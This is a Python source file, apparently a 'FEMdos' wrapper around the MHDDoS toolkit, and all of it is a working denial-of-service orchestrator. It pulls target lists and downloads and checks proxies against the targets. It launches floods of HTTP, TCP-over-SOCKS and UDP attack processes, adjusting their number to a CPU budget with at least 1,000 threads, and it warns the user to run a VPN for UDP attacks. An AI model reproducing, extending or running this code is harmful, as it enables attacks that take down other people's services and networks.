import argparse
import json
import multiprocessing
import os
import random
import subprocess
import sys
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import psutil

from MHDDoS.start import ProxyManager
from PyRoxy import ProxyChecker, ProxyType
from targman import TargetManager, Target

__author__ = [
    "PornPrincess"
]

# FEMdos Theme Activated! 💖✨
# Let's keep it fabulous, darling! 💅💖

# Target Manager for all things FEMdos! 💖✨
_TargetManager = TargetManager()

# Variable to store the latest targets
current_targets = []

# -------------------------------
# TARGET & PROXY UPDATE FUNCTIONS
# -------------------------------
def update_targets(period):
    global current_targets
    current_targets = _TargetManager.get_all_targets()
    print(f"✨ Targets updated: {len(current_targets)} fabulous targets! 💖✨")
    # Schedule the next update after the given period
    threading.Timer(period, update_targets, [period]).start()


def update_proxies(period: int, proxy_timeout: float, targets: list):
    if os.path.exists('files/proxies/proxies.txt'):
        last_update = os.path.getmtime('files/proxies/proxies.txt')
        if (time.time() - last_update) < period / 2:
            return  # Proxies are already fab enough for now!

    with open('../proxies_config.json') as f:
        config = json.load(f)

    proxies = list(ProxyManager.DownloadFromConfig(config, 0))
    random.shuffle(proxies)

    checked_proxies = []
    size = len(targets)
    print(f'✨ Checking {len(proxies):,} proxies... Get ready for some action! 💖')

    with ThreadPoolExecutor(size) as executor:
        futures = [
            executor.submit(
                ProxyChecker.checkAll,
                proxies=proxies[i::size],
                timeout=proxy_timeout,
                threads=((100*psutil.cpu_count()) // size),  # Roughly 100*CPU cores distributed per target
                url=target.url
            )
            for i, target in enumerate(targets)
        ]
        for future in as_completed(futures):
            checked_proxies.extend(future.result())

    if not checked_proxies:
        sys.exit("💔 Proxy check failed! Network troubles or target not available. Let's fix that, darling!")

    os.makedirs('files/proxies/', exist_ok=True)
    with open('files/proxies/proxies.txt', "w") as all_wr, \
         open('files/proxies/socks4.txt', "w") as socks4_wr, \
         open('files/proxies/socks5.txt', "w") as socks5_wr:
        for proxy in checked_proxies:
            proxy_str = f"{proxy}\n"
            all_wr.write(proxy_str)
            if proxy.type == ProxyType.SOCKS4:
                socks4_wr.write(proxy_str)
            elif proxy.type == ProxyType.SOCKS5:
                socks5_wr.write(proxy_str)


# --------------------------------------
# HELPER FUNCTIONS FOR THREAD MANAGEMENT
# --------------------------------------
def get_total_spawned_threads(processes):
    """Return the total number of threads currently spawned (summed over all processes)."""
    return sum(thread_count for (_, thread_count) in processes)


def predict_threads_for_cpu(cpu_limit, processes, targets):
    """
    Advanced prediction algorithm for how many new threads to spawn
    to reach the desired CPU usage limit, ensuring that at least 1,000 threads
    are running at any given time.

    This function:
      - Warms up each process's CPU counter,
      - Measures the total CPU usage from all active processes reliably,
      - Computes the average CPU load per thread,
      - Estimates how many new threads are needed based on the remaining CPU capacity,
      - Accounts for multi-core environments (since system-wide usage is over all cores),
      - Ensures a minimum addition if total threads fall below 1,000,
      - Guarantees at least one new thread per target if threads are added.

    Parameters:
        cpu_limit (float): The target overall CPU usage percentage (e.g., 20.0 for 20%).
        processes (list): List of tuples (process, thread_count) for all active processes.
        targets (list): List of targets (used to enforce a minimum of one thread per target).

    Returns:
        int: The number of new threads to spawn.
    """
    total_cpu_usage = 0.0
    total_threads_running = 0

    # Warm up the CPU counters for all processes (set interval=None to initialize)
    for proc, _ in processes:
        try:
            psutil.Process(proc.pid).cpu_percent(interval=None)
        except psutil.NoSuchProcess:
            continue

    # Wait a short time to gather an accurate delta (this ensures our stats aren't "fake")
    time.sleep(1)

    # Now measure each process's CPU usage (non-blocking with interval=None)
    for proc, thread_count in processes:
        try:
            proc_cpu = psutil.Process(proc.pid).cpu_percent(interval=None)
        except psutil.NoSuchProcess:
            continue
        total_cpu_usage += proc_cpu
        total_threads_running += thread_count

    # Get overall system CPU usage for context (this is averaged over all cores)
    system_cpu = psutil.cpu_percent(interval=0.1)
    total_cores = psutil.cpu_count(logical=False)  # Get number of physical cores
    print(f"[DEBUG] Overall system CPU usage: {system_cpu:.2f}% across {total_cores} cores.")

    # Compute average CPU usage per thread (avoid division by zero)
    if total_threads_running > 0:
        avg_cpu_per_thread = total_cpu_usage / total_threads_running
        print(total_cpu_usage, total_threads_running)
    else:
        avg_cpu_per_thread = 0.1  # Fallback if nothing is running

    print(f"[DEBUG] Average CPU usage per thread: {avg_cpu_per_thread:.4f}%")

    # Baseline prediction: if no threads are running, set baseline to 1000
    if total_threads_running == 0 or avg_cpu_per_thread == 0:
        predicted_new_threads = 1000
        print(f"[DEBUG] No running threads or avg_cpu_per_thread is 0, using baseline: {predicted_new_threads}")
    else:
        # Calculate remaining CPU capacity (note: if using multi-core, adjust if needed)
        cpu_diff = cpu_limit - total_cpu_usage
        if cpu_diff <= 0:
            predicted_new_threads = 0
            print("[DEBUG] CPU usage is at or above target. No new threads needed.")
        else:
            predicted_new_threads = int(cpu_diff / avg_cpu_per_thread)
            print(f"[DEBUG] CPU difference: {cpu_diff:.2f} -> Predicted threads based on CPU diff: {predicted_new_threads}")

    # Ensure that if we are adding threads, we add at least one per target.
    if predicted_new_threads > 0 and predicted_new_threads < len(targets):
        predicted_new_threads = len(targets)
        print(f"[DEBUG] Adjusted predicted threads to at least one per target: {predicted_new_threads}")

    # Enforce a minimum of 1,000 threads running at any given time.
    required_min_threads = 1000 - total_threads_running
    if required_min_threads > predicted_new_threads:
        print(f"[DEBUG] Total threads running ({total_threads_running}) is below 1000; "
              f"ensuring a minimum addition of {required_min_threads} threads.")
        predicted_new_threads = required_min_threads

    print(f"[DEBUG] Final predicted new threads to spawn: {predicted_new_threads} to reach {cpu_limit}% CPU usage "
          f"and a minimum of 1000 threads running.")
    return predicted_new_threads


# ---------------------------------------
# CPU MONITOR & DYNAMIC PROCESS SPAWNING
# ---------------------------------------
def monitor_cpu_usage(processes, cpu_limit, period, rpc, udp_threads, http_methods, debug, targets):
    """
    Continuously check overall CPU usage. If it is below the target, spawn additional 
    processes (each handling a given number of threads) to bring the usage up. If it exceeds
    the target, randomly kill a process.
    """
    while True:
        cpu_percent = psutil.cpu_percent(interval=1)  # Get the overall CPU usage
        print(f"✨ Overall CPU usage: {cpu_percent}% 💖")

        if cpu_percent > cpu_limit:
            print(f"💔 CPU usage exceeded {cpu_limit}%. Killing some processes to maintain fabulousness!")
            if processes:
                proc_tuple = random.choice(processes)
                proc, thread_count = proc_tuple
                print(f"✨ Killing process {proc.pid} which had {thread_count} threads 💖✨")
                try:
                    psutil.Process(proc.pid).terminate()
                except Exception as e:
                    print(f"Error terminating process {proc.pid}: {e}")
                processes.remove(proc_tuple)
        elif cpu_percent < cpu_limit:
            print("Limit not exceeded.")
            new_threads = predict_threads_for_cpu(cpu_limit, processes, targets)
            if new_threads > 0:
                # Distribute the new threads evenly among targets.
                threads_per_target = new_threads // len(targets)
                if threads_per_target < 1:
                    threads_per_target = 1
                new_threads = threads_per_target * len(targets)
                print(f"✨ Spawning {new_threads} new threads (~{threads_per_target} per target) 💖")

                # Spawn processes based on the calculated number of threads
                for target in targets:
                    if target.url.lower().startswith('udp://'):
                        params = ['UDP', target.url[6:], str(udp_threads), str(period)]
                        thread_count = udp_threads
                        p = subprocess.Popen([sys.executable, './start.py', *list(map(str, params))])
                        processes.append((p, thread_count))
                    elif target.url.lower().startswith('tcp://'):
                        # For TCP, we launch two processes (one for SOCKS4 and one for SOCKS5)
                        thread_count_each = max(1, threads_per_target // 2)
                        params = ['TCP', target.url[6:], str(thread_count_each), str(period), '4', 'socks4.txt']
                        p = subprocess.Popen([sys.executable, './start.py', *list(map(str, params))])
                        processes.append((p, thread_count_each))
                        params = ['TCP', target.url[6:], str(thread_count_each), str(period), '5', 'socks5.txt']
                        p = subprocess.Popen([sys.executable, './start.py', *list(map(str, params))])
                        processes.append((p, thread_count_each))
                    else:
                        method = random.choice(target.methods)
                        params = [method, target.url, '0', str(threads_per_target), 'proxies.txt', str(rpc), str(period)]
                        thread_count = threads_per_target
                        p = subprocess.Popen([sys.executable, './start.py', *list(map(str, params))])
                        processes.append((p, thread_count))

        time.sleep(5)  # Check every 5 seconds


# ---------------------------------------
# STARTING THE DDOS (PROCESS SPAWNING)
# ---------------------------------------
def run_ddos(targets: list, period: int, rpc: int, udp_threads: int, http_methods: list, debug: bool, cpu_limit: float):
    """
    Initially spawn one process per target (or two for TCP targets), then let the CPU
    monitor dynamically add (or remove) processes until the CPU usage reaches the target.
    """
    # Start minimally; additional threads will be spawned dynamically.
    params_list = []
    processes = []  # List of tuples: (process, thread_count)

    for target in targets:
        if target.url.lower().startswith('udp://'):
            print(f"💔 UDP target detected. Ensure VPN is on! Target: {target.url}")
            params = ['UDP', target.url[6:], str(udp_threads), str(period)]
            thread_count = udp_threads
            params_list.append((params, thread_count))
        elif target.url.lower().startswith('tcp://'):
            # For TCP, we launch two processes (one for SOCKS4 and one for SOCKS5)
            thread_count_each = 1
            params = ['TCP', target.url[6:], str(thread_count_each), str(period), '4', 'socks4.txt']
            params_list.append((params, thread_count_each))
            params = ['TCP', target.url[6:], str(thread_count_each), str(period), '5', 'socks5.txt']
            params_list.append((params, thread_count_each))
        else:
            method = random.choice(target.methods)
            params = [method, target.url, '0', '1', 'proxies.txt', str(rpc), str(period)]
            thread_count = 1
            params_list.append((params, thread_count))

    for params, thread_count in params_list:
        params = list(map(str, params))
        p = subprocess.Popen([sys.executable, './start.py', *params])
        processes.append((p, thread_count))

    # Continuously monitor and adjust CPU usage by spawning/killing processes.
    monitor_cpu_usage(processes, cpu_limit, period, rpc, udp_threads, http_methods, debug, targets)

    # Wait for all processes to finish (rarely reached, since monitor_cpu_usage loops infinitely)
    for p, _ in processes:
        p.wait()


def start(period: int, targets: list, rpc: int, udp_threads: int, http_methods: list, proxy_timeout: float, debug: bool, cpu_limit: float):
    os.chdir('MHDDoS')  # FEMdos headquarters! 💖
    no_proxies = all(target.url.lower().startswith('udp://') for target in targets)

    while True:
        if not no_proxies:
            update_proxies(period, proxy_timeout, targets)
        run_ddos(targets, period, rpc, udp_threads, http_methods, debug, cpu_limit)


def init_argparse() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser()
    # The threads argument is no longer used in this version.
    parser.add_argument('-p', '--period', type=int, default=300,
                        help='How often to update the proxies (in seconds) 💖✨')
    parser.add_argument('--proxy-timeout', type=float, default=2, metavar='TIMEOUT',
                        help='How long to wait for a proxy connection (default is 2) 💅✨')
    parser.add_argument('--rpc', type=int, default=50,
                        help='Requests to send per proxy (default is 50) 💖✨')
    parser.add_argument('--udp-threads', type=int, default=1,
                        help='Threads for UDP targets 💅✨')
    parser.add_argument('--debug', action='store_true', default=False,
                        help='Enable debug output from FEMdos (because we need to stay fabulous) 💖✨')
    parser.add_argument('--http-methods', nargs='+', default=['GET', 'STRESS', 'BOT', 'SLOW'],
                        help='List of HTTP(s) attack methods to use. Default: GET, STRESS, BOT, SLOW 💅✨')
    parser.add_argument('--cpu-limit', type=float, default=20.0,
                        help='Max CPU usage limit as a percentage (default is 20%) 💖✨')
    return parser


def get_methods_for_target(target: Target) -> list:
    return target.methods


def main():
    args = init_argparse().parse_args()
    
    # Initial target fetch and update.
    update_targets(600)
    threading.Timer(args.period, update_targets, [600]).start()

    while True:
        if current_targets:
            methods = [get_methods_for_target(target) for target in current_targets]
            start(args.period, current_targets, args.rpc, args.udp_threads, methods,
                  args.proxy_timeout, args.debug, args.cpu_limit)
        else:
            print("💔 No targets available! Please check the target manager.")
            time.sleep(args.period)


if __name__ == "__main__":
    main()
